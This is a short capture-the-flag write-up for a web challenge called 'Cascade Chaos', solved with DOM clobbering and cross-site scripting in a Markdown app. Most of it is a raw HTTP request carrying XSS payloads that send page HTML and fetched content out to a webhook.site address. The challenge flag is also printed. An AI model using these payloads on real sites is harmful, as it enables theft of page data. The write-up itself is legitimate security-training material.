# Cascade Chaos

Solved by: @vicevirus

## Question:
A Markdown app that looks harmless... or is it? Can you find the subtle cracks in the system and make things a bit more... interesting? A little creativity goes a long way.


## Solution:
dom clobber in heading, which will allow us to run XSS on the remote service
```
<a id="isSafe">
```

XSS in local service, `color` parameter
```
POST /visit HTTP/1.1
Host: 35.224.222.30:4001
Content-Length: 323
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://35.224.222.30:4001
Referer: http://35.224.222.30:4001/convert?heading=%3Ca+id%3DisSafe%3E&content=%3Cimg%20src%3D%22x%22%20onerror%3D%22fetch(%27http%3A%2F%2Fhttpforever.com%27,%20%7B%20mode%3A%20%27no-cors%27%20%7D)%20.then(response%20%3D%3E%20response.text())%20.then(data%20%3D%3E%20location.href%20%3D%20%27https%3A%2F%2Fwebhook.site%2F0456830e-cbc2-4057-b98c-fe389f00f79c%2F%3Fc%3D%27%20%2B%20encodeURIComponent(data))%3B%22%3E
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{
  "content": "<p><img src=\"x\" onerror=\"location.href='http://local:4002/flag?color=black</style><script>window.onload=function(){location.href=%27https://webhook.site/0456830e-cbc2-4057-b98c-fe389f00f79c/?c=%27%2bbtoa(document.documentElement.outerHTML)}</script>'\" ></p>",
  "heading": "<a id=\"isSafe\"></a>"
}
```

**Flag:** `flag{cha0tic_styl3_sh33ts}`
